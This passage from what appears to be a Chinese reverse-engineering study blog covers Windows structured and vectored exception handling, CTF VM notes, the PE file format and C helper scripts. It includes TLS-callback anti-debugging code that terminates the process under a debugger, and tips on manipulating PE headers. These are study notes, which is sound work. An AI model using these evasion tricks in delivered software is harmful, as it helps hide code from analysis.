基础finally1234567891011121314151617181920212223242526#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main(void)&#123; __try &#123; printf(&quot;异常代码可能发生部分 &quot;); __leave; // 使用 __leave 跳出当前的 __try ,这是正常退出的方式之一 //goto flag; //异常退出方式 &#125; __finally &#123; // 无论 __try 以何种方式退出，都会执行这里的指令 printf(&quot;退出 &quot;); if (AbnormalTermination()) printf(&quot;异常退出 &quot;); else printf(&quot;正常退出 &quot;); &#125; flag: return 0;&#125; 导入 EXCEPTION_EXECUTE_HANDLER(1)：表示该异常被识别处理，从异常处下一条指令继续执行 EXCEPTION_CONTINUE_EXECUTION(-1)：表示异常被忽略，从异常处下一条指令继续执行,将错就错 EXCEPTION_CONTINUE_SEARCH(0)：表示异常不能识别，交给下一个SEH 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;windows.h&gt;#include &lt;stdio.h&gt;DWORD func(DWORD ExceptionType, PEXCEPTION_POINTERS ExceptionInfo)&#123; printf(&quot;ExceptionType: %X &quot;, ExceptionType); if (ExceptionType == EXCEPTION_INT_DIVIDE_BY_ZERO) &#123; ExceptionInfo-&gt;ContextRecord-&gt;Eax = 16; ExceptionInfo-&gt;ContextRecord-&gt;Ecx = 16; return EXCEPTION_CONTINUE_EXECUTION; //异常被忽略或已被修复，程序控制留跳转到导致异常的那条指令，并尝试重新执行这条指令 &#125; return EXCEPTION_EXECUTE_HANDLER;//1 异常已经被识别，也即当前的这个异常错误，系统已经找到了并能够确认 //EXCEPTION_CONTINUE_SEARCH 0 异常不被识别,寻找下一个异常处理函数&#125;int main()&#123; int number = 0; __try &#123; number /= 0;//因为异常处理函数返回EXCEPTION_CONTINUE_EXECUTION,所以下面的语句可以继续运行 puts(&quot;Good&quot;); &#125; __except (func(GetExceptionCode(), GetExceptionInformation())) &#123; // 异常处理器，只有 __except 返回 EXCEPTION_EXECUTE_HANDLER=1 才会执行 printf(&quot;__try 中产生了异常，但是我们没有处理异常,或者做了其他的操作 %X &quot;, GetExceptionCode()); &#125; printf(&quot;numebr = %d &quot;, number); return 0;&#125; BeforeSEH | VEH12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;windows.h&gt;#include &lt;stdio.h&gt;LONG WINAPI func(PEXCEPTION_POINTERS ExceptionInfo)&#123; printf(&quot;ExceptionCode: %X &quot;, ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode); if (ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_INT_DIVIDE_BY_ZERO) &#123; ExceptionInfo-&gt;ContextRecord-&gt;Eax = 1; ExceptionInfo-&gt;ContextRecord-&gt;Ecx = 1; return EXCEPTION_CONTINUE_EXECUTION; &#125; return EXCEPTION_EXECUTE_HANDLER;&#125;int main()&#123; int number = 0; // 通过一个API可以直接安装VEH // 参数一是布尔值， // 如果为 TRUE，就将当前的函数添加到全局 VEH 函数的链表头部 // 否则则为尾部 AddVectoredExceptionHandler(TRUE, func); __try &#123; number /= 0; &#125; // 异常首先被 VEH 接收到，如果无法处理才会传递给 SEH __except (EXCEPTION_EXECUTE_HANDLER)//参数是1,但是不会执行,因为交给了VEH &#123; printf(&quot;永远不会被执行 &quot;); &#125; printf(&quot;number = %d &quot;, number); system(&quot;pause&quot;); return 0;&#125; AfterSEH | UEF12345678910111213141516171819202122232425262728293031323334353637#include &lt;windows.h&gt;#include &lt;stdio.h&gt;LONG __stdcall Func(PEXCEPTION_POINTERS ExceptionInfo)&#123; printf(&quot;ExceptionCode: %X &quot;, ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode); if (ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_INT_DIVIDE_BY_ZERO) &#123; ExceptionInfo-&gt;ContextRecord-&gt;Eax = 10; ExceptionInfo-&gt;ContextRecord-&gt;Ecx = 10; return EXCEPTION_CONTINUE_EXECUTION; // 异常如果被处理了，那么就返回重新执行当前的代码 &#125; return EXCEPTION_EXECUTE_HANDLER; // 如果不是自己能够处理的异常，就不处理只报告&#125;int main()&#123; int number = 0; // 安装 ，是整个异常处理的最后一环 , //非调试模式下才会被调用,调试模式下,就算发生了除零异常,检测到最后也不会处理异常 SetUnhandledExceptionFilter(Func); __try &#123; number /= 0; &#125; __except (EXCEPTION_CONTINUE_SEARCH)//参数是0,当然不会执行 &#123; printf(&quot;不会被执行 &quot;);//这个 &#125; printf(&quot;number = %d &quot;, number); return 0;&#125; SEHSloved | VCH在最后一个异常处理后,要做的事情,得处理然后执行 BeforeSEH -&gt; NormalSEH -&gt; AfterSEH -&gt; SEHSolved AfterSEH 一定会执行,只是一个返回值的问题 SEHSolved 如果没有找到正常的SEH,会跟着AfterSEH 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#include &lt;windows.h&gt;#include &lt;stdio.h&gt;LONG WINAPI BeforeSEH(EXCEPTION_POINTERS* ExceptionInfo)&#123; printf(&quot;VEH: ExceptionCode: %X &quot;, ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode); if (ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_INT_DIVIDE_BY_ZERO) &#123; ExceptionInfo-&gt;ContextRecord-&gt;Eax = 1; ExceptionInfo-&gt;ContextRecord-&gt;Ecx = 1; return EXCEPTION_CONTINUE_SEARCH;//扔给下一个 &#125; return EXCEPTION_EXECUTE_HANDLER;//处理完毕&#125;DWORD NormalSEH(PEXCEPTION_POINTERS ExceptionInfo)&#123; printf(&quot;SEH: ExceptionCode: %X &quot;, ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode); if (ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_INT_DIVIDE_BY_ZERO) &#123; ExceptionInfo-&gt;ContextRecord-&gt;Eax++; ExceptionInfo-&gt;ContextRecord-&gt;Ecx = 1; return EXCEPTION_CONTINUE_SEARCH;//扔给下一个 &#125; return EXCEPTION_EXECUTE_HANDLER;//处理完毕&#125;LONG WINAPI AfterSEH(PEXCEPTION_POINTERS ExceptionInfo)&#123; printf(&quot;AfterSEH: ExceptionCode: %X &quot;, ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode); if (ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_INT_DIVIDE_BY_ZERO) &#123; ExceptionInfo-&gt;ContextRecord-&gt;Eax++; ExceptionInfo-&gt;ContextRecord-&gt;Ecx = 1; return EXCEPTION_CONTINUE_EXECUTION;//忽略,继续执行下一步 &#125; return EXCEPTION_EXECUTE_HANDLER;//处理完毕&#125;LONG WINAPI SEHSolved(PEXCEPTION_POINTERS ExceptionInfo)&#123; // SEHSolved 不会对异常进行处理，调用的时机和异常处理的情况有关 printf(&quot;SEHSolved: ExceptionCode: %X &quot;, ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode); return EXCEPTION_CONTINUE_SEARCH;//扔给下一个&#125;int main()&#123; int number = 0; AddVectoredExceptionHandler(TRUE, BeforeSEH); SetUnhandledExceptionFilter(AfterSEH); AddVectoredContinueHandler(TRUE, SEHSolved); //BeforeSEH -&gt; NormalSEH -&gt; AfterSEH -&gt; SEHSolved //BeforeSEH 扔给下一个 //NormalSEH 扔给下一个 //AfterSEH 忽略,继续执行下一步 //SEHSolved 扔给下一个 __try &#123; number /= 0; &#125; __except (NormalSEH(GetExceptionInformation())) &#123; printf(&quot;SEH: 异常处理器 &quot;);//不会执行,因为所有的异常处理函数都不想处理它 &#125; printf(&quot;number = %d &quot;, number); system(&quot;pause&quot;); return 0;&#125; jmp_bufjmp_buf 是一个数据类型 setjmp(jmp_buf_var) 就是初始化一个变量jmp_buf_var,第一次初始化会返回0 jmp_buf_var 里面保存了在当前ip的运行环境 longjmp(jmp_buf_var,1);就是根据jmp_buf_var的环境,跳转到上一次保存的环境,那个1是任意的一个返回值 因为setjmp很好的保存了各个寄存器的值,所以就可以很好的跳转回去正常运行(除非变量的依赖性不是很强) 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;setjmp.h&gt; //异常的特征码,无关紧要 typedef enum _ErrorCode_ &#123; ERR_OK = 100, ERR_DIV_BY_ZERO = -1 &#125; ErrorCode; jmp_buf gExcptBuf; typedef int (*pf)(int, int); int my_div(int a, int b) &#123; if (b==0) &#123; printf(&quot;try excepton. error = %d &quot;, ERR_DIV_BY_ZERO); longjmp(gExcptBuf,1);//ERR_DIV_BY_ZERO 是携带的返回值 &#125; return a / b; &#125;int my_try(pf func, int a, int b) &#123; int flag = setjmp(gExcptBuf); //保存才开始的环境 int sum=0;\tif (flag==0) &#123; sum=func(a, b); //正常的调用 return sum; &#125; return 0; &#125; int main() &#123; int result = my_try(my_div, 8, 0); //int result = my_try(my_div, 8, 2); printf(&quot;%d &quot;,result); puts(&quot;GoodBye&quot;); return 0; &#125;","tags":["C","Exception"],"categories":["Language"]},{"title":"学习CTF的代码虚拟化","path":"/re4mile/2021/06/07/re/VM/EXE/re/","content":"参考链接1nt3 :https://www.anquanke.com/post/id/252573#h3-8 misc: https://www.chuanpuyun.com/article/5736.html 导入手写一个类似的CPU执行系统 比如用全局变量去构造堆栈 实现一些加减乘除 实现一些跳转,函数的调用 解题一般步骤： 分析VM结构-&gt;分析opcode-&gt;编写parser-&gt;re算法 VM结构常见类型： 基于栈、基于队列、基于信号量 opcode： 与VM数据结构对应的指令 ：push pop 运算指令：add、sub、mul","tags":["CTF"],"categories":["Reverse"]},{"title":"PE文件格式基础篇","path":"/re4mile/2021/06/07/re/PE/基础/re/","content":"PEDos头因为Dos Stub的大小不固定 所以dos头的大小也就不固定 Dos MZ Header12345struct _IMAGE_DOS_HEADER &#123; 0x00 WORD w_magic; //value=&quot;MZ&quot; EXE的标志 0x3c DWORD dw_lfanew; // PE头在文件中的偏移地址 &#125;; Dos头有4行 你可以修改e_lfanew来迁移NT头的位置 除了2个重要的字段,其它的字段,你都可以干坏事情 Dos Stub可以把它CC,没有用 所以你可以修改dw_lfanew然后把NT头向前移动,掩盖以前的Dos存根 PE头签名字段value&#x3D;”PE&#x2F;0&#x2F;0” 文件头描述exe的主要基本信息,一共有0x1.4行 20个字节 其它的都不是那么的重要了 123456789WORD IMAGE_MACHINE Machine //运行的环境 WORD NumberOfSections // 多少个节区 time_t TimeDateStamp //什么时候创建的,参考不可信 //置为0 DWORD PointerToSymbolTable\t//debug符号表在哪里 //置为0 DWORD NumberOfSymbols //符号有多少 //置为0 WORD SizeOfOptionalHeader // 选项头的大小 struct Characteristics //文件的属性,文件是干什么的 NumberOfSection节区数一定要大于0, 如果表的节区数不和实际的节区数一致就会无法执行 SizeofOptionHeader它指出了可选头的大小, 为什么要指出 因为里面有一个数据目录表数组,这个数组的大小是可变的… 而且选项头分为32位,64位,嵌入式选项头,所以大小是不固定的 32位的是0xE0 64位的是0xF0 Characteristics 选项头12345673个数量4个地址2个对齐4个sys信息x73个大小1属性4个堆栈信息 寻找0x60个大小后,就是数据目录表 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950struct _IMAGE_OPTIONAL_HEADER &#123; 0x00 WORD Magic; //表名了我们的PE是x86还是x64,或者嵌入式的 0x02 BYTE MajorLinkerVersion;//主链接器版本号 没用CC 0x03 BYTE MinorLinkerVersion;//次链接器版本号 没用CC //3个数量 0x04 DWORD SizeOfCode; //代码的数量, 运行时不参考,OD调试器会参考,用于OD反调试 , 0x08 DWORD SizeOfInitializedData; //已经初始化的数据,比如全局变量,常量 运行时不参考 0x0c DWORD SizeOfUninitializedData; //没有初始化的数据, 运行时不参考 //4个地址 0x10 DWORD AddressOfEntryPoint; //程序的EP,代码正式开始执行的地方,也就是start,不是main 0x14 DWORD BaseOfCode; //代码的基地址 运行时不参考 0x18 DWORD BaseOfData; //数据的基地址 运行时不参考 0x1c DWORD ImageBase; //在内存中,装载地址 //2对齐 0x20 DWORD SectionAlignment; //VA对齐 0x24 DWORD FileAlignment; //FA对齐 //4个系统信息 0x28 WORD MajorOperatingSystemVersion; 0x2a WORD MinorOperatingSystemVersion; 0x2c WORD MajorImageVersion; 0x2e WORD MinorImageVersion; 0x30 WORD MajorSubsystemVersion; //它不可以修改,其它可以修改 0x32 WORD MinorSubsystemVersion; 0x34 DWORD Win32VersionValue;\t//在xp环境下,他的值得为0 //3个大小 0x38 DWORD SizeOfImage; //根据文件对齐和内存对齐,这个字段决定了在内存中,exe所占的大小 0x3c DWORD SizeOfHeaders; //所有PE头的大小 0x40 DWORD CheckSum; //校验和 ,没用,如果是驱动文件,可能会有用 //2个属性 0x44 WORD Subsystem; //是一些属性,比如是窗口文件还是控制台...GUI,Dos 0x46 WORD DllCharacteristics; // //4个堆栈信息 0x48 DWORD SizeOfStackReserve;\t//max 保留的空间 0x4c DWORD SizeOfStackCommit;\t//real 实践提交的空间 0x50 DWORD SizeOfHeapReserve; 0x54 DWORD SizeOfHeapCommit; 0x58 DWORD LoaderFlags;//无用 0x5c DWORD NumberOfRvaAndSizes; //数据目录表的成员个数 0x60 _IMAGE_DATA_DIRECTORY DataDirectory[16];//数据目录表&#125; File&#x2F;Section Alignmentwin10的FileAlignment好像只能200对齐以上 文件对齐指出了节区在磁盘的最小对齐单位 节区对齐指出了节区在内存中对齐的最小单位 坑 我们的地址只能是对齐值得整数倍 如果对齐值不是整数倍就会被强制类型转化 比如R2PD&#x3D;10,那么会被转化为0 NumberOfRvaandSizes数据目录数组 本来有16个,number of rva and size通常也是16 但是如果number of rva and size&#x3D;6 那么数组16个仍然存在,但是后从第6个开始后面的就会舍弃不访问 ImageBase对于EXE文件来说，每个文件使用的都是独立的虚拟地址空间， 所以，优先装入的地址通常不会被其他模块占据。也就是说，EXE文件总是能按照这个地址装入，这就意味着装入后的EXE文件不需要进行重定位了 你可以自己定义这个值，但取值有限制: 第一，取值不能超出边界，即取的值必须在进程地址空间中: 第二，该值必须是64KB的整数倍。 节区头0x2.8行 占用40 节区之间是挨在一起的,不能重叠或者间隔 而且节区最后是空，也就是有个空的节区表示介绍。。。很不理解。。只能说最好是这样 我发现节区表的顺序必须和节区的顺序对应要一一对应 也就是说第一个节区如果是text,那么第一个节区表就必须是text的 …或者是因为其它地原因 向PE文件添加数据 1.添加一个节区 2.扩大最后一个节区 12345678910111213141516171819202122struct IMAGE_SECTION_HEADER SectionHeaders[n]&#123; BYTE Name[8];//8字节的字符串名字,说明性信息,不一定以0结尾 union Misc &#123; DWORD PhysicalAddress; DWORD VirtualSize;//数据大小,未对齐 &#125; //内存描述 DWORD VirtualAddress; //数据去向,RVA DWORD SizeOfRawData;//数据大小,对齐后 DWORD PointerToRawData;//数据来源,FA //文件描述,运行时不依赖,可以CC它 DWORD PointerToRelocations; DWORD PointerToLinenumbers; WORD NumberOfRelocations; WORD NumberOfLinenumbers; //内存属性 DWORD Characteristics;//4字节 酌情修改 FC代表可读可写可执行&#125; 在文件头结束那里,+可选头的大小 结果就是节区头地址 Data Directory一般情况下,一共占有0x80个 导出- Export [0]导出表EAT(DLL导出到exe) 导出表不是dll专门有的,exe也可以有导出表 Export_Size无用 如果用名称导入,那么查表就会用到AddressOfFunc,AddressOfOrdianl,AddressOfFunc 如果用序号导入,就只用Base和,AddressOfFunc 1234567891011121314typedef struct _IMAGE_EXPORT_DIRECTORY &#123; DWORD Characteristics; //未使用 DWORD TimeDateStamp; //时间戳 WORD MajorVersion; //未使用 WORD MinorVersion; //未使用 DWORD Name; //字符串指针 DWORD Base; //基址编号 DWORD NumberOfFunctions; // 函数的个数,其中是有空函数的 DWORD NumberOfNames; // 带字符串名字的函数个数 DWORD AddressOfFunctions; // dword数组, 实际函数的RvA数组 DWORD AddressOfNames; // dword数组 DWORD AddressOfNameOrdinals; // word数组 &#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY; 函数GetProAddress 1234FARPROC GetProcAddress( [in] HMODULE hModule, // DLL模块句柄 [in] LPCSTR lpProcName // 函数名); 导入 -Import [1] 0x1.4个行 exe从dll导入信息 在DIY创建导入表的时候,说IAT和INT表至少8字节才算有效 123456789101112131415struct _IMAGE_IMPORT_DESCRIPTOR &#123; 0x00 union &#123; 0x00 DWORD Characteristics; 0x00 DWORD OriginalFirstThunk;//INT 以0结尾,如果数组成员是0x80000----,表示他为序号导入 &#125; u; 0x04 DWORD TimeDateStamp; //无用 当时间戳=0,表示dll的地址没有被绑定 ,当时间戳=0xFFFFFFFF,也就是-1,表示dll的地址被绑定了 0x08 DWORD ForwarderChain; //无用 0x0c DWORD Dll_Name;//指向dll字符串的RVA\t//导入dll的时候,可以不要.dll后缀名 0x10 DWORD FirstThunk;//IAT,以0结尾,&#125;; 导入表什么时候结束?? 当成员的Dll_Name字段是0就结束..而不需要整个结构体全部为0 通常情况下OriginalFirstThunk和FirstThunk指向相同的数据内容,我门称这种为双桥结构的导入表,也就是通过OriginalFirstThunk和FirstThunk 我们都可以遍历到INT 还有一种情况是只有FirstThunk指向了INT,此刻称之为单桥结构,这种结构不可以绑定导入表 关于为什么会有OriginalFirstThunk和FirstThunk指向了相同的数据内容,而且你还觉得很啰嗦… 如果只有FirstThunk,当PeLOad后,之前的函数名称的指针数组就丢失了,数组的内容被替换为函数的地址VA 那么就不再还有指针数组指向这个名称数组了 当然,如果孤掷一注的话,我门也不需要有谁指向这个名称数组 时间戳 不太理解这句话 不太理解这句话 然后我发现 不同的简单的2个exe去调用MessageBox的API的时候 他们的函数地址都是一样的….!!!!!! 资源 [2]struct IMAGE_DATA_DIRECTORY 重定位 [5]dll在加载的时候,肯定需要重定位 dll一般会在高空运行,不会去抢位置 各个dll贴在exe的内存中,是挨得比较紧密的,但是各个dll之间会有对齐的行为,默认的对齐是1 0000 h,也就是64k 数据目录表的重定位的size很有用,它决定了有多少地方需要重定位 123456typedef struct _IMAGE_BASE_RELOCATION &#123; DWORD VirtualAddress;//RVA DWORD SizeOfBlock; // WORD\tArr[1];&#125; IMAGE_BASE_RELOCATION,* PIMAGE_BASE_RELOCATION; 每一个代码页都有这样的数据结构 VirtualAddress决定来了代码页的骶椎 SizeOfBlock 决定了这个数据结构的大小 (SizeOfBlock-2)&#x2F;2就是柔性数组的成员个数 根据这个数据结构,一个代码页一个代码页的遍历,直到遍历的长度&gt;重定位表的size就结束 假设x&#x3D;arr[xx]; (x&amp;0xF000)&gt;&gt;3,如果结果是3,表示对应地址的4个字节都要修改,一般情况下,我们的遇到的都是3 (x&amp;0x0FFFF)+VirtualAddress就是需要修改的地方的RVA地址 *((x&amp;0x0FFFF)+VirtualAddress+ImageBase)就是需要修改的值 修改的值&#x3D;新的ImageBase-旧的ImageBase+原有的地址 TLS [9]eg1DLL_PROCESS_ATTACH &#x3D; 0 DLL_THREAD_ATTACH &#x3D; 1 DLL_THREAD_DETACH &#x3D; 2 DLL_PROCESS_DETACH &#x3D; 3 tls函数定义 12345void func(DWORD,DWORD,DWORD)参数1 句柄参数2 调用原因|代号参数3 附加参数 1234567891011121314151617181920212223242526#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#pragma comment(linker, &quot;/INCLUDE:__tls_used&quot;) //使用tls功能void _stdcall TLSFun1(DWORD DllHandle, DWORD Reason, DWORD Reserved);//也就是一个简单函数的声明void _stdcall TLSFun2(DWORD DllHandle, DWORD Reason, DWORD Reserved);#pragma data_seg(&quot;.CRT$XLX&quot;)PIMAGE_TLS_CALLBACK pTLS_CALLBACKs[] = &#123; TLSFun1, TLSFun2, 0 &#125;; //注册函数的地址#pragma data_seg()//下面是具体体函数的实现void _stdcall TLSFun1(DWORD DllHandle, DWORD Reason, DWORD Reserved)&#123; //线程开始前调用&#125;void _stdcall TLSFun2(DWORD DllHandle, DWORD Reason, DWORD Reserved)&#123; //线程开始后调用&#125;int main()//主线程&#123; &#125; 调用原因 1234DLL_PROCESS_ATTACH = 1 主线程开始前DLL_THREAD_ATTACH = 2 子线程开始前DLL_THREAD_DETACH = 3 子线程结束后DLL_PROCESS_DETACH = 0 主线程结束后 eg 123456789101112131415161718192021222324#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#pragma comment(linker, &quot;/INCLUDE:__tls_used&quot;)void NTAPI TLS_CALLBACK(PVOID DllHandle, DWORD Reason, PVOID Reserved)&#123; char sz_tmp[16] = &#123; 0 &#125;; sprintf(sz_tmp, &quot;Debugger Detected! %d&quot;, Reason); if (IsDebuggerPresent()) &#123; MessageBoxA(NULL, sz_tmp, &quot;TLS Callback&quot;, MB_OK); ExitProcess(1); &#125;&#125;#pragma data_seg(&quot;.CRT$XLX&quot;)PIMAGE_TLS_CALLBACK pTLS_CALLBACKs[] = &#123; TLS_CALLBACK, 0 &#125;;#pragma data_seg()int main(void)&#123; MessageBoxA(NULL, &quot;Hello :)&quot;, &quot;main()&quot;, MB_OK);&#125; eg21234567891011121314151617181920212223242526272829303132333435#include&lt;Windows.h&gt;#include &lt;stdio.h&gt;HANDLE gh_tmp;void test();DWORD WINAPI MY_ThreadProc(LPVOID);DWORD32 MY_GetValue(DWORD32);int main()&#123;\ttest();\tWaitForSingleObject(gh_tmp,-1);\tgetchar();\treturn;&#125;void test()&#123;\tgh_tmp=CreateThread(0,0,MY_ThreadProc,0,0,0);\treturn;&#125;DWORD WINAPI MY_ThreadProc(LPVOID lp_Param)&#123;\tDWORD32 dw_tmp=0,index=0;\tindex=TlsAlloc();\tTlsSetValue(index,(LPVOID)0x6789);\tdw_tmp=MY_GetValue(index);\tprintf(&quot;0x%p/n&quot;,dw_tmp);\treturn 0;&#125;DWORD32 MY_GetValue(DWORD32 index)&#123;\tDWORD32 dw_tmp=0;\tdw_tmp=(DWORD32)TlsGetValue(index);\tTlsFree(index);\treturn dw_tmp;&#125; 每个线程TEB都保留了自己进程的PEB,TEB成员的0x30就指向了PEB 这个TEB是自己线程的,也就是把自己当作主线程局部空间 然后线程TEB的0xe10成员就指向了自己独立的线程局部存储空间 这个数组是 VOID* tlsShot[64] 我们的TEB的0xe10&#x3D;Arr地址 12345678typedef struct _IMAGE_TLS_DIRECTORY32 &#123; DWORD StartAddressOfRawData;//文件主线程局部存储tls的起点 DWORD EndAddressOfRawData;//文件主线程局部存储tls的终点 DWORD AddressOfIndex; //主线程tls所在的下标 DWORD AddressOfCallBacks; //指向一个函数指针数组,以 0结尾,函数是先于main函数执行的回调函数 DWORD SizeOfZeroFill; //0xCCCCCCCC DWORD Characteristics; //0xCCCCCCCC&#125; IMAGE_TLS_DIRECTORY32; 加载的时候,文件[ StartAddressOfRawData, EndAddressOfRawData]的数据会被复制到堆区去 1234567891011121314151617#include&lt;Windows.h&gt;#include &lt;stdio.h&gt;__declspec(thread) int g_value=0x40;BOOL WINAPI MY_Tls_Fun(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved)&#123;\tif(fdwReason==DLL_PROCESS_ATTACH) MessageBox(0,&quot;DqxGh0st&quot;,0,0);\treturn TRUE;&#125;int main(int argc,char* argv[])&#123;\targc=g_value;\tgetchar();\treturn;&#125; eg312345678910111213141516171819202122#define _CRT_SECURE_NO_WARNINGS#include &lt;stdio.h&gt;#include &lt; Windows.h&gt; #pragma section(&quot;.CRT$XLY&quot;, long, read)__declspec(thread) int var = 0xDEADBEEF;VOID _stdcall TlsCallback(PVOID DllHandle, DWORD Reason, PVOID Reserved)&#123; var = 0xB15BADB0; // Required for TLS Callback call if (IsDebuggerPresent()) &#123; MessageBoxA(NULL, &quot;Stop debugging program!&quot;, &quot;Error&quot;, MB_OK | MB_ICONERROR); TerminateProcess(GetCurrentProcess(), 0xBABEFACE); &#125;&#125;__declspec(allocate(&quot;.CRT$XLY&quot;))PIMAGE_TLS_CALLBACK g_tlsCallback = TlsCallback;int main()&#123; puts(&quot;Hello World&quot;); return 0;&#125; 绑定导入表 [11]有无绑定导入表是根据导入表的时间戳来判断的 时间戳&#x3D;0,表示没有被绑定 时间戳&#x3D;-1,表示有被绑定 绑定导入表中涉及的地址与操作系统有关,如果更换了操作系统,那么绑定的地址就会失效,于是操作系统就会检测到无效,然后自己去重新PeLoad那个IAT IAT [12]它指向了某个dll的IAT 第一次我发现是kernel32","tags":["PE"],"categories":["Reverse"]},{"title":"Re的加密算法总结","path":"/re4mile/2021/06/07/re/加密算法/总结/re/","content":"待学习的参考链接傅里叶加密 https://joi.usst.edu.cn/html/2015/1/20150116.htm#outline_anchor_5 https://zhuanlan.zhihu.com/p/104079068 https://baike.baidu.com/item/%E5%82%85%E9%87%8C%E5%8F%B6%E5%8F%98%E6%8D%A2/7119029 https://www.cnblogs.com/h2zZhou/p/8405717.html 在线网站MD5 https://www.cmd5.com/ 脚本.find 找下标1234567891011121314151617181920212223242526272829303132333435363738#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;int* find_index(const char* base_table_, const char* source_);int main()&#123;\tint* index_table = find_index(&quot;ABCDEFGH&quot;,&quot;GAE&quot;);\tfree(index_table);\treturn 0;&#125;/*函数的功能:找出table表中的index值参数:(const char*,const char*)返回值: 一个堆区的数组,也就是index数组*/int* find_index(const char* base_table_, const char* source_)&#123;\tchar* base_table = (char*)calloc(1024, sizeof(char));\tchar* source = (char*)calloc(1024, sizeof(char));\tint* index_table = (int*)calloc(1024, sizeof(int));\tif (base_table == NULL || source == NULL || index_table == NULL)\t&#123; puts(&quot;find_index calloc wrong&quot;); exit(-1);\t&#125;\tunsigned int i = 0, ii = 0;\tstrcpy(base_table, base_table_);\tstrcpy(source, source_);\tfor (i = 0; i &lt; strlen(source); i++) for (ii = 0; ii &lt; strlen(base_table); ii++) if (source[i] == base_table[ii]) index_table[i] = ii;\tfree(base_table);\tfree(source);\treturn index_table;&#125; rstr 逆序字符串123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;unsigned char* rstr(unsigned char*);int main(int argc, char* argv[])&#123; unsigned char str[] = &quot;123456789&quot;; rstr(str); puts((char*)str); &#125;unsigned char* rstr(unsigned char* str)&#123; unsigned char* tmp = (unsigned char*)calloc(1024, sizeof(unsigned char)); if (tmp == NULL) exit(-1); unsigned int i = 0; unsigned int begin = 0, end = 0; //寻找起始的下标和末尾的下标 i = 0; for (; str[i] == 0;i++); begin = i;//于是获取了第一个i的位置 ,开始的位置 for (; str[i] != 0xcc&amp;&amp; str[i] != 0; i++); end = i;//于是获取了最后一个i的位置,结束的位置 //逆序复制 for (i = 0; end &gt; begin; i++)//因为是--end,所以是end &gt; begin,而不是end &gt;= begin tmp[i] = str[--end];//把后面的移动到前面去 //转移 strcpy((char*)str, (const char*)tmp);//把逆序好的字符串拷贝到原有字符串当中去 //释放 free(tmp); return (unsigned char*)str;&#125; read_str 读取数组123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;void read_str(unsigned char*);int main(int argc, char* argv[])&#123; unsigned char str[] = &quot;123456789\\0\\0\\0\\0\\0&quot;; str[0] = 0; read_str(str); &#125;void read_str(unsigned char* str)&#123; unsigned int i = 0; unsigned int begin = 0, end = 0; //寻找起始的下标和末尾的下标 i = 0; for (; str[i] == 0;i++); begin = i;//于是获取了第一个i的位置 ,开始的位置 for (; str[i] &lt;0x80&amp;&amp;str[i]!=0; i++); end = i;//于是获取了最后一个i的位置,结束的位置 putchar(&#x27; &#x27;); for (; begin &lt; end; begin++) printf(&quot;%c &quot;, str[begin]); putchar(&#x27; &#x27;);&#125; read-arr12345678910111213141516171819202122#include &lt;stdio.h&gt;void read_arr(unsigned int *arr,int len);int main(int argc, char* argv[])&#123; int arr[]=&#123; 1,2,3,4,5,6,7,8,9 &#125;; int len=sizeof(arr)/sizeof(arr[0]); read_arr((unsigned int *)arr,len); &#125;void read_arr(unsigned int *arr,int len)&#123;\tunsigned int i=0;\tputchar(&#x27; &#x27;); for(i=0;i&lt;len;i++) printf(&quot;%d &quot;,arr[i]); putchar(&#x27; &#x27;);\t&#125; str_num ascii-&gt;int123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;unsigned int* str_num(const unsigned char* s);int main(int argc, char *argv[])&#123;\tunsigned char s[]=&quot;dqx&quot;;\tunsigned int* ptr=str_num(s);\tprintf(&quot;%d&quot;,ptr[2]);\treturn 0;&#125;unsigned int* str_num(const unsigned char* s)&#123;\tunsigned int* d=(unsigned int*)calloc(1024,sizeof(unsigned int)); if(d==NULL) exit(-1);\tunsigned int i=0;\twhile(s[i])\t&#123; d[i]=s[i]; i++;\t&#125;\treturn d;&#125; ＞︿＜ 字符串给数值化1234567891011121314151617181920#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;char* str_long_long(char* s);int main()&#123;\tchar* tmp = str_long_long((char*)&quot;D0g3&quot;);\tprintf(&quot;0x%016s &quot;, tmp);&#125;char* str_long_long(char* s)&#123;\tchar* longlong = (char*)calloc(10, sizeof(char)); if (longlong == NULL) exit(-1);\tunsigned int len = strlen(s);\tunsigned int i = 0, end = 0;\tend = len - 1;\tfor (i = 0; i &lt; len; i++) sprintf(&amp;longlong[2 * i], &quot;%02X&quot;, s[end - i]);//一次性写入了2个字节 ;\t*((short*) (&amp;longlong[2 * i])) = 0;//把最后末尾的2个字节置为00\treturn longlong;//&#125;","tags":["逆向加密算法"],"categories":["Reverse"]},{"title":"数字电路公式","path":"/re4mile/2021/06/07/re/加密算法/数字电路/re/","content":"待学习的参考链接在线网站数字电路连续的数^1 1234567891001 00 03 02 05 04 07 06 09 0811 10 13 12 15 14 17 16 19 1821 20 23 22 25 24 27 26 29 2831 30 33 32 35 34 37 36 39 3841 40 43 42 45 44 47 46 